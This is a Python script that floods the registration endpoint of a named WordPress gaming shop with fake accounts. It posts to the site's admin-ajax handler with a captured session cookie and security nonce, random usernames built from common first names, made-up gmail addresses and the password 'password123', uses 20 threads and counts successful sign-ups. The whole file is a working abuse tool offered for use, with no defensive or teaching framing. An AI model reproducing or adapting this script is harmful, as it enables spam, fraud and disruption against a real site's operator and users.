import requests
import random
import string
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
import sys
from colorama import init, Fore, Style

# Initialize colorama
init(autoreset=True)

# Define the URL and headers
url = "https://mlbbshop.com/wp-admin/admin-ajax.php"
headers = {
    "accept": "application/json, text/javascript, */*; q=0.01",
    "accept-language": "en-US,en-GB;q=0.9,en;q=0.8",
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "cookie": "_lscache_vary=7b26bf5cfe76293c6220ef41fc87fd13; tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; tk_ai=IUWBzrF%2FE7I0aE4vYoJK%2Bca3; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-06-15%2018%3A05%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fmlbbshop.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-06-15%2018%3A05%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fmlbbshop.com%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F126.0.0.0%20Safari%2F537.36; hidecta=no; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fmlbbshop.com%2Fregister%2F",
    "origin": "https://mlbbshop.com",
    "priority": "u=1, i",
    "referer": "https://mlbbshop.com/register/",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin",
    "sec-gpc": "1",
    "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "x-requested-with": "XMLHttpRequest"
}

# Define the wordlist of usernames
usernames = ["mohammed", "mohammad", "sharmin", "jannatul", "abdul"]

# Disable proxies
proxies = {
    "http": None,
    "https": None
}

# Initialize counters and lock
success_count = 0
attempt_count = 0
lock = Lock()

# Function to generate a random username with digits
def generate_username():
    base_username = random.choice(usernames)
    random_digits = ''.join(random.choices(string.digits, k=10))
    full_username = f"{base_username}{random_digits}"
    return full_username

# Function to send the POST request and check for success
def register_user():
    global success_count, attempt_count
    username = generate_username()
    email = f"{username}@gmail.com"
    data = {
        "action": "theplus_ajax_register",
        "user_login": username,
        "email": email,
        "password": "password123",  # Use a secure password in a real scenario
        "conf_password": "password123",
        "security": "d8d0f73b68",
        "dis_cap": "no",
        "dis_password": "yes",
        "dis_password_conf": "yes",
        "dis_mail_chimp": "no",
        "mail_chimp_check": "no",
        "mcl_double_opt_in": "no",
        "mc_cst_group_value": "",
        "mc_cst_tags_value": "",
        "auto_loggedin": "",
        "mc_custom_apikey": "",
        "mc_custom_listid": ""
    }
    try:
        response = requests.post(url, headers=headers, data=data, proxies=proxies)
        with lock:
            attempt_count += 1
            if response.ok and "successfully" in response.text.lower():
                success_count += 1
            sys.stdout.write(f"\r{Fore.RED}[{Fore.GREEN}{username}{Fore.RED}]{Fore.RESET}<>"
                             f"{Fore.RED}[{Fore.YELLOW}{attempt_count}{Fore.RED}]{Fore.RESET}<>"
                             f"{Fore.RED}[{Fore.GREEN}SUCCESS:{success_count}{Fore.RED}]{Fore.RESET}")
            sys.stdout.flush()
    except Exception as e:
        with lock:
            attempt_count += 1
            sys.stdout.write(f"\r{Fore.RED}[{Fore.GREEN}{username}{Fore.RED}]{Fore.RESET}<>"
                             f"{Fore.RED}[{Fore.YELLOW}{attempt_count}{Fore.RED}]{Fore.RESET}<>"
                             f"{Fore.RED}[{Fore.GREEN}SUCCESS:{success_count}{Fore.RED}]{Fore.RESET}")
            sys.stdout.flush()

# Main function to execute concurrent requests
def main():
    with ThreadPoolExecutor(max_workers=20) as executor:  # Adjust the number of workers as needed
        futures = [executor.submit(register_user) for _ in range(100)]  # Adjust the range as needed
        for future in as_completed(futures):
            future.result()

if __name__ == "__main__":
    main()
